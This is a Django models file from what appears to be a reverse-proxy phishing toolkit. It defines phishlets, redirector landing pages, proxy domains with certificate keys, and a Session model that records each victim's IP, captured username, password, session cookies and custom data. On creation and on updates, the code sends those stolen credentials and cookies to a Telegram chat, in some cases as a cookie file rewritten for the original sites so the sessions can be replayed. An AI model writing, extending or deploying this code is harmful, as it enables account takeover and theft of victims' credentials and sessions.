
from django.db import models
from django.utils import timezone
import uuid

import random


def get_random_1_4_domain() -> str:
    #  return random number between 1 to 4
    return random.randint(1, 4)


class Proxy(models.Model):
    PROXY_TYPES = [
        ('http', 'HTTP Proxy'),
        ('https', 'HTTPS Proxy'),
        ('socks4', 'SOCKS4 Proxy'),
        ('socks5', 'SOCKS5 Proxy'),
    ]
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    name = models.CharField(max_length=100, help_text="Display name for the proxy")
    proxy_type = models.CharField(max_length=10, choices=PROXY_TYPES, default='http', help_text="Type of proxy")
    host = models.CharField(max_length=255, help_text="Proxy hostname or IP address")
    port = models.PositiveIntegerField(help_text="Proxy port number")
    username = models.CharField(max_length=255, blank=True, help_text="Proxy authentication username (optional)")
    password = models.CharField(max_length=255, blank=True, help_text="Proxy authentication password (optional)")
    is_active = models.BooleanField(default=True, help_text="Whether this proxy is active and available")
    created_at = models.DateTimeField(default=timezone.now, editable=False)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ["name"]
        verbose_name = "Proxy"
        verbose_name_plural = "Proxies"

    def __str__(self) -> str:
        return f"{self.name} ({self.proxy_type}://{self.host}:{self.port})"

    def get_proxy_url(self) -> str:
        """Get the proxy URL string"""
        if self.username and self.password:
            return f"{self.proxy_type}://{self.username}:{self.password}@{self.host}:{self.port}"
        return f"{self.proxy_type}://{self.host}:{self.port}"

    def clean(self) -> None:
        # Ensure valid TCP/UDP port range
        if not (1 <= int(self.port) <= 65535):
            from django.core.exceptions import ValidationError
            raise ValidationError({"port": "Port must be between 1 and 65535."})



class Redirectors(models.Model):
    """
    will be used to ave html pages ( html page called redirector)
    """
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    name = models.CharField(max_length=150, unique=True, help_text="Unique identifier, used as filename.")
    data = models.TextField(help_text="HTML code for the redirector")
    created_at = models.DateTimeField(default=timezone.now, editable=False)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ["name"]

    def __str__(self) -> str:  # noqa: D401
        return self.name


class Phishlet(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    name = models.SlugField(max_length=150, unique=True, help_text="Unique identifier, used as filename.")
    data = models.JSONField(help_text="Phishlet JSON content.")
    is_active = models.BooleanField(default=True)
    proxy_auth = models.CharField(max_length=255, blank=True, help_text="Random URL path for proxy authentication")
    proxy = models.ForeignKey(
        Proxy, 
        on_delete=models.SET_NULL, 
        null=True, 
        blank=True, 
        related_name="phishlets",
        help_text="Proxy to use for this phishlet (optional)"
    )
    redirector = models.ForeignKey(
        Redirectors,
        on_delete=models.SET_NULL,
        null=True,
        blank=True,
        related_name="redirectors",
        help_text="if redirector is on it will be used as landing page"
    )
    is_cache_enabled = models.BooleanField(default=True, help_text="Whether static file caching is enabled for this phishlet")
    created_at = models.DateTimeField(default=timezone.now, editable=False)
    updated_at = models.DateTimeField(auto_now=True)

    

    class Meta:
        ordering = ["name"]

    def __str__(self) -> str:  # noqa: D401
        return self.name
    
    def get_auth_url(self) -> str:
        
        # if in phishlet landing_host is tools.domain.com and proxy host has tools.domain.com and its proxy host is tt then auth url should be https://tt.xx.in/
        
        phishlet = self.data
        
        landing_host = phishlet.get('landing_host', '')
        proxy_host = phishlet.get('proxy_domain', '')  

        if landing_host == '':
            return 'Error: landing_host is empty'  



        print(f"landing_host: {landing_host}, proxy_host: {proxy_host}")
        # check if landing_host is not having subdomain
        if '.' in landing_host:
            parts = landing_host.split('.')
            print(f"parts: {parts}")
            if len(parts) > 2 :
                print(f"landing_host is having subdomain")
                pass
            else:
                print(f"landing_host is not having subdomain")
                return f"https://{proxy_host}"



        if landing_host and proxy_host:
            
            # Check if there's a specific proxy_subdomain for this landing_host
            hosts_to_proxy = phishlet.get('hosts_to_proxy', [])
            
            for i, host_config in enumerate(hosts_to_proxy):
                if host_config.get('host') == landing_host:
                    proxy_subdomain = host_config.get('proxy_subdomain', '')
                    
                    if proxy_subdomain:
                        # Extract the main domain from landing_host (e.g., from "tools.fluxxset.com" get "fluxxset.com")
                        if '.' in landing_host:
                            parts = landing_host.split('.')
                            if len(parts) >= 2:
                                main_domain = '.'.join(parts[-2:])
                                result_url = f"https://{proxy_subdomain}.{proxy_host}"
                                return result_url
                        else:
                            result_url = f"https://{proxy_subdomain}.{proxy_host}"
                            return result_url
                    else:
                        pass
                else:
                    pass
            
            
            # Fallback: Extract the main domain from landing_host and use proxy_host as subdomain
            if '.' in landing_host:
                parts = landing_host.split('.')
                if len(parts) >= 2:
                    main_domain = '.'.join(parts[-2:])
                    result_url = f"https://{proxy_host}.{main_domain}"
                    return result_url
                else:
                    pass
            
            result_url = f"https://{proxy_host}.{landing_host}"
            return result_url
        else:
            if not landing_host:
                pass
            if not proxy_host:
                pass
            return ''





class DNSSettings(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    dns_port = models.PositiveIntegerField(default=53, help_text="DNS server port (1-65535)")
    created_at = models.DateTimeField(default=timezone.now, editable=False)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        verbose_name = "DNS Settings"
        verbose_name_plural = "DNS Settings"

    def __str__(self) -> str:  # noqa: D401
        return f"DNS Settings (port {self.dns_port})"

    def clean(self) -> None:
        # Ensure valid TCP/UDP port range
        if not (1 <= int(self.dns_port) <= 65535):
            from django.core.exceptions import ValidationError
            raise ValidationError({"dns_port": "Port must be between 1 and 65535."})


class ProxyDomain(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    hostname = models.CharField(
        max_length=253,
        unique=True,
        help_text="Fully-qualified domain name or subdomain (e.g. example.com, api.example.com)",
    )
    is_active = models.BooleanField(default=False)
    created_at = models.DateTimeField(default=timezone.now, editable=False)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ["hostname"]
        verbose_name = "Proxy Domain"
        verbose_name_plural = "Proxy Domains"

    def __str__(self) -> str:  # noqa: D401
        return self.hostname


class DomainCertificate(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    domain = models.OneToOneField(
        ProxyDomain,
        on_delete=models.CASCADE,
        related_name="certificate",
    )
    cert_pem = models.TextField(help_text="PEM encoded certificate (including chain if needed)")
    key_pem = models.TextField(help_text="PEM encoded private key")
    created_at = models.DateTimeField(default=timezone.now, editable=False)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        verbose_name = "Domain Certificate"
        verbose_name_plural = "Domain Certificates"

    def __str__(self) -> str:  # noqa: D401
        return f"Certificate for {self.domain.hostname}"


class Session(models.Model):
    """
    Session model to track unique visitor sessions based on phishlet and domain combinations.
    Each visitor gets a separate session for each phishlet+domain combination they visit.
    """
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    session_cookie = models.CharField(max_length=255, blank=True, help_text="Session cookie value")
    phishlet = models.ForeignKey(Phishlet, on_delete=models.CASCADE, related_name="sessions")
    proxy_domain = models.CharField(max_length=255, blank=True, help_text="Proxy domain used for this session")
    visitor_ip = models.GenericIPAddressField(help_text="IP address of the visitor")
    user_agent = models.TextField(blank=True, help_text="User agent string of the visitor")
    captured_username = models.CharField(max_length=255, blank=True, help_text="Username captured from the session")
    captured_password = models.CharField(max_length=255, blank=True, help_text="Password captured from the session")
    captured_cookies = models.JSONField(default=dict, blank=True, help_text="Cookies captured from the session")
    captured_custom = models.JSONField(default=dict, blank=True, help_text="Custom data captured from the session")
    is_active = models.BooleanField(default=True, help_text="Whether this session is active")
    is_captured = models.BooleanField(default=False, help_text="Whether this session has captured data")
    is_proxy_auth = models.BooleanField(default=False, help_text="Whether this session used proxy authentication")
    telegram_message_id = models.BigIntegerField(null=True, blank=True, help_text="Telegram message ID for notifications")
    created = models.DateTimeField(default=timezone.now, editable=False)
    updated = models.DateTimeField(auto_now=True)



    class Meta:
        ordering = ["-created"]
        unique_together = ["session_cookie", "phishlet"]

    def detect_os(self) -> str:
        ua  = self.user_agent.lower()
        if 'windows' in ua:
            return 'Windows'

        elif 'macintosh' in ua or 'mac os x' in ua:
            return 'MacOS'
        elif 'ubuntu' in ua:
            return 'Ubuntu'
        elif 'linux' in ua:
            return 'Linux'
        elif 'android' in ua:
            return 'Android'
        elif 'iphone' in ua or 'ipad' in ua:
            return 'iOS'
        else:
            return 'Unknown'

    def __str__(self) -> str:
        return f"Session {self.id} - {self.phishlet.name} ({self.visitor_ip})"

    def get_short_session_id(self) -> str:
        """Get a shortened version of the session cookie for display"""
        return self.session_cookie[:8] + "..." if len(self.session_cookie) > 8 else self.session_cookie

    @classmethod
    def create_session(
        cls,
        *,
        session_cookie: str,
        phishlet: Phishlet,
        proxy_domain: str,
        visitor_ip: str,
        user_agent: str,
        is_active: bool = True,
        is_proxy_auth: bool = False,
        **extra_fields,
    ) -> "Session":
        """Factory to create a new Session with consistent defaults.

        Extra captured fields may be passed via extra_fields and will be applied
        before the first save.
        """
        session = cls(
            session_cookie=session_cookie,
            phishlet=phishlet,
            proxy_domain=proxy_domain,
            visitor_ip=visitor_ip,
            user_agent=user_agent,
            is_active=is_active,
            is_proxy_auth=is_proxy_auth,
        )
        # Apply any optional captured fields
        for field_name, value in extra_fields.items():
            if hasattr(session, field_name):
                setattr(session, field_name, value)
        session.save()
        # Send initial notification and store message ID
        try:
            from .notify import notify_session_captured  # Local import to avoid circular dependency
            session_data = {
                'session_id': str(session.id),
                'phishlet_name': session.phishlet.name if session.phishlet else 'Unknown',
                'captured_username': session.captured_username or 'N/A',
                'captured_password': session.captured_password or 'N/A',
                'ip_address': session.visitor_ip,
                'user_agent': session.user_agent,
                'proxy_domain': session.proxy_domain,
                'captured_cookies': session.captured_cookies or {},
                'captured_custom': session.captured_custom or {},
                'created': session.created,
            }
            message_id = notify_session_captured(session_data)
            if message_id:
                session.telegram_message_id = message_id
                session.save(update_fields=['telegram_message_id'])
        except Exception:
            # Avoid breaking the creation flow if notifications fail
            pass
        return session

    def update_captured_data(self, **kwargs):
        """Update captured data fields"""
        return self.update_session_data(**kwargs)

    def update_session_data(self, **kwargs):
        """Update captured data fields in a single, consistent method."""
        # Track if we're capturing new credentials
        had_credentials_before = self.has_captured_data()
        had_username_before = bool(self.captured_username)
        had_password_before = bool(self.captured_password)
        
        for field, value in kwargs.items():
            if hasattr(self, field):
                setattr(self, field, value)
        
        # Update is_captured field
        self.is_captured = self.has_captured_data()
        
        # Save with all updated fields including is_captured
        update_fields = list(kwargs.keys()) + ['is_captured']
        self.save(update_fields=update_fields)
        # If captured-related fields changed, maybe notify and update existing message with attachment (1-in-4 chance)
        try:
            changed_keys = set(kwargs.keys())
            notify_on = {'captured_username', 'captured_password', 'captured_cookies', 'captured_custom'}
            if changed_keys & notify_on:
                from .notify import notify_session_updated, notification_manager  # Local import to avoid circular dependency
                prev_id = self.telegram_message_id
                # Only proceed with attachment flow if we have an existing message to update
                if get_random_1_4_domain() == 1 and prev_id:
                    # Build a concise caption summarizing the update (Telegram caption limit ~1024)
                    caption_lines = [
                        "🔄 Session Updated",
                        f"📋 {self.phishlet.name if self.phishlet else 'Unknown'}",
                        f"👤 {self.captured_username or 'N/A'}",
                        f"🔑 {self.captured_password or 'N/A'}",
                        f"🌐 {self.visitor_ip}",
                        f"🕒 {self.updated}",
                    ]
                    caption = "\n".join(caption_lines)
                    if len(caption) > 1000:
                        caption = caption[:1000] + "…"

                    # Transform cookies to original domains per phishlet before file creation
                    transformed = notification_manager.transform_cookies_for_phishlet(
                        self.captured_cookies or {},
                        self.phishlet.data if getattr(self, 'phishlet', None) and isinstance(self.phishlet.data, dict) else {},
                        self.proxy_domain or ''
                    )
                    cookies_payload = {
                        'cookies': transformed,
                        'custom_data': self.captured_custom or {},
                    }
                    temp_path = notification_manager.create_cookies_file(cookies_payload, str(self.id))
                    if temp_path:
                        try:
                            ok = notification_manager.edit_telegram_message_media(prev_id, temp_path, caption)
                            if not ok:
                                # Fallback: do not send a new message; attempt caption-only update
                                notification_manager.edit_telegram_message_caption(prev_id, caption)
                        finally:
                            notification_manager.cleanup_temp_file(temp_path)
                else:
                    # Default behavior: edit the existing text message
                    session_data = {
                        'session_id': str(self.id),
                        'phishlet_name': self.phishlet.name if self.phishlet else 'Unknown',
                        'captured_username': self.captured_username or 'N/A',
                        'captured_password': self.captured_password or 'N/A',
                        'ip_address': self.visitor_ip,
                        'user_agent': self.user_agent,
                        'proxy_domain': self.proxy_domain,
                        'captured_cookies': self.captured_cookies or {},
                        'captured_custom': self.captured_custom or {},
                        'created': self.created,
                        'updated': self.updated,
                    }
                    new_id = notify_session_updated(session_data, prev_id)
                    if new_id and new_id != prev_id:
                        self.telegram_message_id = new_id
                        self.save(update_fields=['telegram_message_id'])
        except Exception:
            # Do not raise from model method
            pass
        
    
    def _send_capture_notification(self):
        """Notifications disabled in model methods."""
        
    def add_captured_cookie(self, name: str, value: str):
        """Add a captured cookie to the session"""
        had_cookies_before = bool(self.captured_cookies and len(self.captured_cookies) > 0)
        
        if not self.captured_cookies:
            self.captured_cookies = {}
        self.captured_cookies[name] = value
        self.save(update_fields=['captured_cookies'])
        # Notifications disabled in model methods

    def add_custom_data(self, key: str, value: str):
        """Add custom captured data to the session"""
        had_custom_before = bool(self.captured_custom and len(self.captured_custom) > 0)
        
        if not self.captured_custom:
            self.captured_custom = {}
        self.captured_custom[key] = value
        self.save(update_fields=['captured_custom'])
        # Notifications disabled in model methods
    
    def has_captured_data(self) -> bool:
        """Check if any data has been captured"""
        has_credentials = bool(self.captured_username or self.captured_password)
        has_cookies = bool(self.captured_cookies and len(self.captured_cookies) > 0)
        has_custom = bool(self.captured_custom and len(self.captured_custom) > 0)
        return has_credentials or has_cookies or has_custom
    
    def save(self, *args, **kwargs):
        """Override save to automatically update is_captured field"""
        self.is_captured = self.has_captured_data()
        super().save(*args, **kwargs)

    def domain_matches(self, domain: str) -> bool:
        """
        Check if a given domain matches this session's proxy_domain.
        Supports wildcard domains like '.xx.in' which match all subdomains.
        
        Args:
            domain: The domain to check (e.g., 'login.xx.in', 'api.xx.in')
            
        Returns:
            bool: True if the domain matches the session's proxy_domain
        """
        if not self.proxy_domain or not domain:
            return False
            
        # Use the same logic as the fixed HTTP server
        # Check if domain exactly matches proxy_domain or is a subdomain
        return domain == self.proxy_domain or domain.endswith('.' + self.proxy_domain)


class NotificationSettings(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    telegram_bot_token = models.CharField(max_length=255, blank=True, help_text="Telegram bot token for notifications")
    telegram_chat_id = models.CharField(max_length=255, blank=True, help_text="Telegram chat ID to send notifications to")
    is_active = models.BooleanField(default=True, help_text="Whether notifications are enabled")
    created_at = models.DateTimeField(default=timezone.now, editable=False)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        verbose_name = "Notification Settings"
        verbose_name_plural = "Notification Settings"

    def __str__(self) -> str:
        return f"Notification Settings ({'Active' if self.is_active else 'Inactive'})"

    def clean(self) -> None:
        if self.is_active:
            if not self.telegram_bot_token:
                from django.core.exceptions import ValidationError
                raise ValidationError({"telegram_bot_token": "Bot token is required when notifications are active."})
            if not self.telegram_chat_id:
                from django.core.exceptions import ValidationError
                raise ValidationError({"telegram_chat_id": "Chat ID is required when notifications are active."})
